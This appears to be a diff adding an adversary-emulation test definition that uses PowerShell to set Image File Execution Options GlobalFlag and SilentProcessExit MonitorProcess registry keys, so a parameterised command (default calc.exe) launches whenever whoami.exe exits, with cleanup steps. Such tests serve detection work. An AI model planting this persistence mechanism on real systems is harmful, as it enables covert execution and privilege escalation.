@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: GlobalFlags in Image File Execution Options
+description: "The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n"
+args:
+    - name: process
+      type: string
+      default: whoami.exe
+    - name: cmd_to_run
+      type: string
+      default: cmd.exe /c calc.exe
+uuid: 13117939-c9b2-4a43-999e-0a543df92f0d
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+    subtechniques:
+        - 'T1546.012: Image File Execution Options Injection'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: globalflags-in-image-file-execution-options
+      inline: "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{{.Args.process}}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\{{.Args.process}}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"{{.Args.cmd_to_run}}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe\n"
+      executor: powershell
+      cleanup:
+        inline: "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\{{.Args.process}}\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{{.Args.process}}\"\nRemove-Item $registryPath -force\n"
+        executor: powershell
